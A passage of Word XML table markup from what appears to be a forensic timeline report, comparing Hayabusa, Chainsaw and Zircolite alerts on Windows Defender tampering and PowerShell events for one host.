            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>29</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#5903</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:46.897000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Hayabusa</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Defender</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>5001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>29</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#5905</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:46.897377</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Chainsaw</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29</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#67</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:46.897377</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Zircolite</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29</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>zircolite/zircolite_timeline_0.jsonl#202</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 11:02:11.567000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Disable Windows Defender Functionalities Via Registry Keys</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>DESKTOP-KJ81A5A</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Sysmon</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>13</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>292</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#1615</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 11:02:11.567907</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Chainsaw</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Disable Windows Defender Functionalities Via Registry Keys</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13</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>292</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#24</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 11:02:11.567907</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Zircolite</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Disable Windows Defender Functionalities Via Registry Keys - Sysmon</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13</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>292</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>zircolite/zircolite_timeline_0.jsonl#215</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 11:02:12.400000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Windows Defender Threat Detection Disabled</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>DESKTOP-KJ81A5A</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Defender</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>5001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>53</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#5904</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 11:02:12.400000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Hayabusa</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Defender</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>5001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>53</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#5906</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 11:02:12.400713</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Chainsaw</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53</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#68</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 11:02:12.400713</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Zircolite</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DESKTOP-KJ81A5A</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53</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>zircolite/zircolite_timeline_0.jsonl#216</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 11:06:40.922000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PwSh</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>4104</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>68</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#565</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 11:06:40.922548</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68</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#5</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 11:06:40.922548</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68</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>zircolite/zircolite_timeline_0.jsonl#229</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 11:06:40.923000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PwSh</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>4103</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>69</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#562</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 11:06:40.923254</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69</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#7</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 11:06:40.923254</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69</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>zircolite/zircolite_timeline_0.jsonl#230</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 11:06:40.925000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PwSh</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>4104</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>72</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#566</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 11:06:40.925897</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72</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#9</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 11:06:40.925897</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72</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>zircolite/zircolite_timeline_0.jsonl#233</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 11:06:40.926000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PwSh</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>4103</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>73</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#563</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 11:06:40.926630</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73</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#11</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 11:06:40.926630</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73</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>zircolite/zircolite_timeline_0.jsonl#234</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 11:06:40.929000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PwSh</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>4103</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>77</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#564</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 11:06:40.929000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Hayabusa</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PwSh</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>4104</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>76</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#567</w:t>
